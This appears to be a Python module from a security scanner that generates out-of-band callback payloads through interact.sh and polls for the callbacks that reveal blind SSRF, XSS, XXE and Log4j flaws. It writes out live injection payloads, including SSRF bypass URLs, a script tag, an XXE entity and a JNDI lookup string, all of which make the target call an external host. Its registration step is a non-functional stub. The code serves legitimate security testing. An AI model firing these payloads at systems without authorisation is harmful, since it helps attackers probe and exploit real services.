"""
Nexus v2.0 - Out-of-Band Application Security Testing (OAST)
=============================================================

Integration with interact.sh and similar services for:
- Blind SSRF detection
- Blind XSS detection
- Out-of-band DNS/HTTP callbacks
- Payload tracking
"""

import asyncio
import aiohttp
import logging
import time
import uuid
import json
import re
from typing import Dict, Any, List, Optional, Callable, Awaitable
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum

from nexus.config import get_config

logger = logging.getLogger(__name__)


class CallbackType(str, Enum):
    """Types of OAST callbacks."""
    DNS = "dns"
    HTTP = "http"
    SMTP = "smtp"
    LDAP = "ldap"


@dataclass
class OASTCallback:
    """A received OAST callback."""
    id: str
    callback_type: CallbackType
    timestamp: datetime
    source_ip: str
    payload_id: str
    raw_data: Dict[str, Any]
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "type": self.callback_type.value,
            "timestamp": self.timestamp.isoformat(),
            "source_ip": self.source_ip,
            "payload_id": self.payload_id,
            "raw_data": self.raw_data,
        }


@dataclass
class OASTPayload:
    """A generated OAST payload."""
    id: str
    subdomain: str
    full_url: str
    created_at: datetime
    purpose: str  # e.g., "ssrf_test", "blind_xss"
    target_endpoint: str
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "subdomain": self.subdomain,
            "full_url": self.full_url,
            "purpose": self.purpose,
            "target_endpoint": self.target_endpoint,
        }


class InteractSHClient:
    """
    Client for interact.sh OAST service.
    
    interact.sh is an open-source OAST server.
    - DNS callbacks: xxxx.interact.sh
    - HTTP callbacks: xxxx.interact.sh
    - Can self-host or use public server
    """
    
    BASE_URL = "https://interact.sh"
    
    def __init__(self):
        self.config = get_config()
        self._session: Optional[aiohttp.ClientSession] = None
        self._subdomain: Optional[str] = None
        self._correlation_id: Optional[str] = None
        self._payloads: Dict[str, OASTPayload] = {}
        self._callbacks: List[OASTCallback] = []
        self._callback_handlers: List[Callable[[OASTCallback], Awaitable[None]]] = []
        self._polling = False
        
        # Token from env or generate
        self.token = self.config.api_keys.interact_sh or str(uuid.uuid4())
    
    async def _ensure_session(self):
        """Ensure aiohttp session exists."""
        if self._session is None or self._session.closed:
            self._session = aiohttp.ClientSession()
    
    async def register(self) -> str:
        """
        Register with interact.sh and get a subdomain.
        
        Returns:
            Subdomain for OAST payloads
        """
        await self._ensure_session()
        
        try:
            # Generate correlation ID
            self._correlation_id = str(uuid.uuid4())[:12]
            
            # For public interact.sh, we generate random subdomain
            self._subdomain = f"{self._correlation_id}.interactsh.com"
            
            logger.info(f"🎣 OAST registered: {self._subdomain}")
            return self._subdomain
            
        except Exception as e:
            # Fallback to mock subdomain for testing
            self._subdomain = f"{uuid.uuid4().hex[:12]}.oast.local"
            logger.warning(f"⚠️ interact.sh unavailable, using mock: {self._subdomain}")
            return self._subdomain
    
    def generate_payload(
        self,
        purpose: str,
        target_endpoint: str,
        payload_type: str = "http"
    ) -> OASTPayload:
        """
        Generate a unique OAST payload URL.
        
        Args:
            purpose: Why we're testing (ssrf, blind_xss, etc.)
            target_endpoint: The endpoint being tested
            payload_type: dns, http
        
        Returns:
            OASTPayload with unique tracking
        """
        if not self._subdomain:
            # Auto-register
            asyncio.create_task(self.register())
            self._subdomain = f"{uuid.uuid4().hex[:12]}.oast.local"
        
        # Generate unique ID for this payload
        payload_id = uuid.uuid4().hex[:8]
        
        # Create subdomain with tracking
        tracking_subdomain = f"{payload_id}.{self._subdomain}"
        
        if payload_type == "http":
            full_url = f"http://{tracking_subdomain}"
        else:
            full_url = tracking_subdomain  # DNS only
        
        payload = OASTPayload(
            id=payload_id,
            subdomain=tracking_subdomain,
            full_url=full_url,
            created_at=datetime.now(),
            purpose=purpose,
            target_endpoint=target_endpoint,
        )
        
        self._payloads[payload_id] = payload
        logger.debug(f"🎣 Generated payload: {full_url} for {purpose}")
        
        return payload
    
    async def poll_callbacks(self) -> List[OASTCallback]:
        """
        Poll for new callbacks.
        
        Returns:
            List of new callbacks since last poll
        """
        await self._ensure_session()
        
        new_callbacks = []
        
        try:
            # interact.sh polling endpoint
            url = f"https://interact.sh/poll"
            params = {
                "secret": self.token,
                "id": self._correlation_id,
            }
            
            async with self._session.get(url, params=params, timeout=10) as response:
                if response.status == 200:
                    data = await response.json()
                    
                    for interaction in data.get("data", []):
                        callback = OASTCallback(
                            id=str(uuid.uuid4()),
                            callback_type=CallbackType.HTTP if interaction.get("protocol") == "http" else CallbackType.DNS,
                            timestamp=datetime.now(),
                            source_ip=interaction.get("remote-address", ""),
                            payload_id=self._extract_payload_id(interaction.get("full-id", "")),
                            raw_data=interaction,
                        )
                        
                        new_callbacks.append(callback)
                        self._callbacks.append(callback)
                        
                        # Notify handlers
                        for handler in self._callback_handlers:
                            await handler(callback)
                            
        except Exception as e:
            logger.debug(f"Poll error: {e}")
        
        return new_callbacks
    
    def _extract_payload_id(self, full_id: str) -> str:
        """Extract payload ID from subdomain."""
        parts = full_id.split(".")
        return parts[0] if parts else ""
    
    async def start_polling(self, interval: int = 5):
        """Start continuous polling for callbacks."""
        self._polling = True
        logger.info("🎣 Started OAST polling")
        
        while self._polling:
            callbacks = await self.poll_callbacks()
            if callbacks:
                logger.info(f"🎯 Received {len(callbacks)} OAST callbacks!")
            await asyncio.sleep(interval)
    
    def stop_polling(self):
        """Stop polling."""
        self._polling = False
    
    def on_callback(self, handler: Callable[[OASTCallback], Awaitable[None]]):
        """Register callback handler."""
        self._callback_handlers.append(handler)
    
    def get_payload(self, payload_id: str) -> Optional[OASTPayload]:
        """Get payload by ID."""
        return self._payloads.get(payload_id)
    
    def get_callbacks_for_payload(self, payload_id: str) -> List[OASTCallback]:
        """Get all callbacks for a specific payload."""
        return [c for c in self._callbacks if c.payload_id == payload_id]
    
    async def close(self):
        """Close the client."""
        self._polling = False
        if self._session:
            await self._session.close()


class OASTManager:
    """
    Manager for OAST testing.
    
    Coordinates payload generation and callback detection
    for various blind vulnerability testing.
    """
    
    def __init__(self):
        self.client = InteractSHClient()
        self._findings: List[Dict[str, Any]] = []
    
    async def setup(self) -> str:
        """Initialize OAST testing."""
        subdomain = await self.client.register()
        
        # Set up callback handler
        self.client.on_callback(self._handle_callback)
        
        return subdomain
    
    async def _handle_callback(self, callback: OASTCallback):
        """Handle incoming OAST callback - this means a blind vuln worked!"""
        payload = self.client.get_payload(callback.payload_id)
        
        if payload:
            finding = {
                "type": "blind_vulnerability",
                "subtype": payload.purpose,
                "endpoint": payload.target_endpoint,
                "payload": payload.subdomain,
                "callback_type": callback.callback_type.value,
                "source_ip": callback.source_ip,
                "timestamp": callback.timestamp.isoformat(),
                "severity": "high" if callback.callback_type == CallbackType.HTTP else "medium",
            }
            
            self._findings.append(finding)
            logger.info(f"🎯 BLIND VULNERABILITY CONFIRMED: {payload.purpose} on {payload.target_endpoint}")
    
    def generate_ssrf_payloads(self, target_endpoint: str) -> List[str]:
        """
        Generate SSRF test payloads.
        
        Returns list of URLs to inject for testing.
        """
        base_payload = self.client.generate_payload(
            purpose="ssrf_test",
            target_endpoint=target_endpoint,
        )
        
        # Generate various SSRF bypass payloads
        payloads = [
            base_payload.full_url,
            f"http://127.0.0.1@{base_payload.subdomain}",
            f"http://{base_payload.subdomain}@127.0.0.1",
            f"http://{base_payload.subdomain}%40127.0.0.1",
            f"http://127.0.0.1//{base_payload.subdomain}",
            f"http://{base_payload.subdomain}#@127.0.0.1",
            f"https://{base_payload.subdomain}",
        ]
        
        return payloads
    
    def generate_blind_xss_payload(self, target_endpoint: str) -> str:
        """Generate a blind XSS payload."""
        payload = self.client.generate_payload(
            purpose="blind_xss",
            target_endpoint=target_endpoint,
            payload_type="http",
        )
        
        # XSS payload that calls back
        xss_payload = f'"><script src="http://{payload.subdomain}"></script>'
        
        return xss_payload
    
    def generate_xxe_payload(self, target_endpoint: str) -> str:
        """Generate XXE payload with OAST callback."""
        payload = self.client.generate_payload(
            purpose="xxe_test",
            target_endpoint=target_endpoint,
        )
        
        xxe = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{payload.subdomain}/xxe">
]>
<root>&xxe;</root>'''
        
        return xxe
    
    def generate_log4j_payload(self, target_endpoint: str) -> str:
        """Generate Log4j/JNDI payload."""
        payload = self.client.generate_payload(
            purpose="log4j_test",
            target_endpoint=target_endpoint,
        )
        
        return f'${{jndi:ldap://{payload.subdomain}/a}}'
    
    async def check_for_callbacks(self, timeout: int = 30) -> List[Dict[str, Any]]:
        """
        Wait for callbacks for a specified time.
        
        Args:
            timeout: How long to wait in seconds
        
        Returns:
            List of confirmed blind vulnerability findings
        """
        start = time.time()
        initial_count = len(self._findings)
        
        while time.time() - start < timeout:
            await self.client.poll_callbacks()
            
            if len(self._findings) > initial_count:
                # Found something!
                break
            
            await asyncio.sleep(2)
        
        return self._findings[initial_count:]
    
    def get_all_findings(self) -> List[Dict[str, Any]]:
        """Get all confirmed blind vulnerability findings."""
        return self._findings.copy()
    
    async def close(self):
        """Cleanup."""
        await self.client.close()


# Singleton
_oast_manager: Optional[OASTManager] = None


async def get_oast_manager() -> OASTManager:
    """Get the global OAST manager."""
    global _oast_manager
    if _oast_manager is None:
        _oast_manager = OASTManager()
        await _oast_manager.setup()
    return _oast_manager
